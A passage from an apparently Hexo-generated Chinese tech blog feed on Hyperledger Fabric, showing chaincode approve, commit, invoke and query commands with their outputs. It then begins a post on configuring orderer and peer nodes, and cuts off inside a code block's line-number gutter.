chaincodes <span class="hljs-literal">on</span> peer:<br><span class="hljs-attribute">Package</span> ID: hyperledger-fabric-contract-java-demo_<span class="hljs-number">1</span>:<span class="hljs-number">7</span>b<span class="hljs-number">2</span>d<span class="hljs-number">658</span>f<span class="hljs-number">6068</span>eb<span class="hljs-number">32</span>c<span class="hljs-number">2</span>cf<span class="hljs-number">030</span>c<span class="hljs-number">42</span>bf<span class="hljs-number">2</span>df<span class="hljs-number">05</span>bbdd<span class="hljs-number">3514</span>a<span class="hljs-number">2</span>a<span class="hljs-number">94</span>cbbd<span class="hljs-number">33</span>b<span class="hljs-number">8229849</span>d<span class="hljs-number">90</span>e, Label: hyperledger-fabric-contract-java-demo_<span class="hljs-number">1</span><br><span class="hljs-comment">#包ID是链码标签和链码二进制文件的哈希值的组合,每个peer节点将生成相同的包ID</span><br><span class="hljs-comment">#将包ID保存为环境变量:</span><br><span class="hljs-attribute">export</span> CC_PACKAGE_ID=hyperledger-fabric-contract-java-demo_<span class="hljs-number">1</span>:<span class="hljs-number">7</span>b<span class="hljs-number">2</span>d<span class="hljs-number">658</span>f<span class="hljs-number">6068</span>eb<span class="hljs-number">32</span>c<span class="hljs-number">2</span>cf<span class="hljs-number">030</span>c<span class="hljs-number">42</span>bf<span class="hljs-number">2</span>df<span class="hljs-number">05</span>bbdd<span class="hljs-number">3514</span>a<span class="hljs-number">2</span>a<span class="hljs-number">94</span>cbbd<span class="hljs-number">33</span>b<span class="hljs-number">8229849</span>d<span class="hljs-number">90</span>e<br></code></pre></td></tr></table></figure><h3 id="批准链码定义"><a href="#批准链码定义" class="headerlink" title="批准链码定义"></a>批准链码定义</h3><p>org1</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/peers/</span>peer0.org1.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/users/</span>Admin@org1.example.com/msp<br>export CORE_PEER_ADDRESS=peer0.org1.example.com:<span class="hljs-number">7051</span><br><br>peer lifecycle chaincode approveformyorg -o orderer0.example.com:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer0.example.com --channelID businesschannel --name hyperledger-fabric-contract-java-demo --version <span class="hljs-number">1.0</span> --<span class="hljs-keyword">package</span>-id $CC_PACKAGE_ID --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer0.example.com<span class="hljs-regexp">/msp/</span>tlscacerts/tlsca.example.com-cert.pem<br><br><br><span class="hljs-keyword">return</span>:<br>INFO txid [eb6daf1f194ae8b109500ca44099942e00710c6a4b83cb68109b4bddc3d7dd32] committed with status (VALID) at peer0.org1.example.com:<span class="hljs-number">7051</span><br></code></pre></td></tr></table></figure><p>org2</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org2MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/users/</span>Admin@org2.example.com/msp<br>export CORE_PEER_ADDRESS=peer0.org2.example.com:<span class="hljs-number">9051</span><br><br>peer lifecycle chaincode approveformyorg -o orderer0.example.com:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer0.example.com --channelID businesschannel --name hyperledger-fabric-contract-java-demo --version <span class="hljs-number">1.0</span> --<span class="hljs-keyword">package</span>-id $CC_PACKAGE_ID --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer0.example.com<span class="hljs-regexp">/msp/</span>tlscacerts/tlsca.example.com-cert.pem<br><br><br><span class="hljs-keyword">return</span>:<br>INFO txid [eb69f8cd075c20987a0138c906cdf294a237094624001fafce225f60aea970be] committed with status (VALID) at peer0.org2.example.com:<span class="hljs-number">9051</span><br></code></pre></td></tr></table></figure><p>检查通道</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">peer lifecycle chaincode checkcommitreadiness --channelID businesschannel --name hyperledger-fabric-contract-java-demo --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer0.example.com<span class="hljs-regexp">/msp/</span>tlscacerts/tlsca.example.com-cert.pem --output json<br><br><br><span class="hljs-keyword">return</span>:<br>&#123;<br><span class="hljs-string">&quot;approvals&quot;</span>: &#123;<br><span class="hljs-string">&quot;Org1MSP&quot;</span>: <span class="hljs-keyword">true</span>,<br><span class="hljs-string">&quot;Org2MSP&quot;</span>: <span class="hljs-keyword">true</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>将链码提交到通道：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode commit -o orderer0.example.com:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer0.example.com --channelID businesschannel --name hyperledger-fabric-contract-java-demo --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer0.example.com<span class="hljs-regexp">/msp/</span>tlscacerts<span class="hljs-regexp">/tlsca.example.com-cert.pem --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles /</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles /</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org2.example.com/</span>peers<span class="hljs-regexp">/peer0.org2.example.com/</span>tls/ca.crt<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407203900445.png" alt="将链码提交到通道"></p><p>用<code>peer lifecycle chaincode querycommitted</code>命令来确认链码定义已提交给通道:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">peer lifecycle chaincode querycommitted --channelID businesschannel --name hyperledger-fabric-contract-java-demo --cafile <span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer0.example.com<span class="hljs-regexp">/msp/</span>tlscacerts/tlsca.example.com-cert.pem<br><br><br><span class="hljs-keyword">return</span>:<br>Committed chaincode definition <span class="hljs-keyword">for</span> chaincode <span class="hljs-string">&#x27;hyperledger-fabric-contract-java-demo&#x27;</span> on channel <span class="hljs-string">&#x27;businesschannel&#x27;</span>:<br>Version: <span class="hljs-number">1.0</span>, Sequence: <span class="hljs-number">1</span>, Endorsement Plugin: escc, Validation Plugin: vscc, Approvals: [Org1MSP: <span class="hljs-keyword">true</span>, Org2MSP: <span class="hljs-keyword">true</span>]<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407204001783.png" alt="确认链码"></p><p>调用链码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 调用 createCat 函数</span><br>peer chaincode invoke -o orderer0.example.com:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer0.example.com --tls --cafile <span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer0.example.com<span class="hljs-regexp">/msp/</span>tlscacerts<span class="hljs-regexp">/tlsca.example.com-cert.pem -C businesschannel -n hyperledger-fabric-contract-java-demo --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles /</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles /</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org2.example.com/</span>peers<span class="hljs-regexp">/peer0.org2.example.com/</span>tls/ca.crt -c <span class="hljs-string">&#x27;&#123;&quot;function&quot;:&quot;createCat&quot;,&quot;Args&quot;:[&quot;cat-KEY&quot;,&quot;test - KEY&quot;,&quot;12&quot;, &quot;red&quot;, &quot;aaa&quot;]&#125;&#x27;</span><br><br><span class="hljs-comment"># 调用 queryCat 函数</span><br>peer chaincode query -C businesschannel -n hyperledger-fabric-contract-java-demo -c <span class="hljs-string">&#x27;&#123;&quot;Args&quot;:[&quot;queryCat&quot; , &quot;cat-KEY&quot;]&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407205722777.png" alt="调用链码"></p><p>couchdb存储的信息</p><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407210112843.png" alt="couchdb存储"></p><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407210136865.png" alt="couchdb存储"></p><p>表明这几笔交易都已经成功执行，并且已经出块了。</p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置fabric中的orderer节点和peer节点</title>
    <link href="/2022/04/03/%E9%85%8D%E7%BD%AEfabric%E4%B8%AD%E7%9A%84orderer%E8%8A%82%E7%82%B9%E5%92%8Cpeer%E8%8A%82%E7%82%B9/"/>
    <url>/2022/04/03/%E9%85%8D%E7%BD%AEfabric%E4%B8%AD%E7%9A%84orderer%E8%8A%82%E7%82%B9%E5%92%8Cpeer%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h3 id="配置fabric中的orderer节点和peer节点"><a href="#配置fabric中的orderer节点和peer节点" class="headerlink" title="配置fabric中的orderer节点和peer节点"></a>配置fabric中的orderer节点和peer节点</h3><p>首先需要生成网络需要的身份文件</p><p>3 个 orderer 节点; 组织 org1 , org1 下有两个 peer 节点， peer0 和 peer1; 组织 org2 , org2 下有两个 peer 节点， peer0 和 peer1;</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Fabric项目还提供了cryptogen工具来在本地生身份文件，这种方式需要提供一个 crypto-config.yaml 配置文件。<br></code></pre></td></tr></table></figure><p>网络拓扑图如下：</p><p><img src="/2022/04/03/%E9%85%8D%E7%BD%AEfabric%E4%B8%AD%E7%9A%84orderer%E8%8A%82%E7%82%B9%E5%92%8Cpeer%E8%8A%82%E7%82%B9/1.png" alt="网络拓扑图"></p><p><a href="https://my.oschina.net/j4love/blog/5453756">配置过程</a>以及<a href="https://github.com/hyperledger/fabric/releases">fabric for linux</a>,这里选择的版本是2.4.1</p><table><thead><tr><th align="center">节点</th><th align="center">宿主机 IP</th><th align="center">hosts</th><th align="center">端口</th></tr></thead><tbody><tr><td align="center">cli</td><td align="center">192.168.177.128</td><td align="center">N/A</td><td align="center">N/A</td></tr><tr><td align="center">orderer</td><td align="center">192.168.177.128</td><td align="center">orderer.example.com</td><td align="center">7050 , 8443 ， 9443</td></tr><tr><td align="center">orderer1</td><td align="center">192.168.177.128</td><td align="center">orderer1.example.com</td><td align="center">8050 , 8444 ，9444</td></tr><tr><td align="center">orderer2</td><td align="center">192.168.177.128</td><td align="center">orderer2.example.com</td><td align="center">9050 , 8445 ，9445</td></tr></tbody></table><p>因为是在单机上使用host所以需要使用不同的端口号作为不同的节点</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">vim /etc/hosts<br><br><span class="hljs-number">192.168.177.128</span>orderer.example.com<br><span class="hljs-number">192.168.177.128</span>orderer1.example.com<br><span class="hljs-number">192.168.177.128</span>orderer2.example.com<br></code></pre></td></tr></table></figure><p>然后再配置每一个orderer的节点的配置文件，主要是修改证书位置以及生成日志、快照文件分别存档的位置。orderer节点的配置文件orderer.yaml</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span 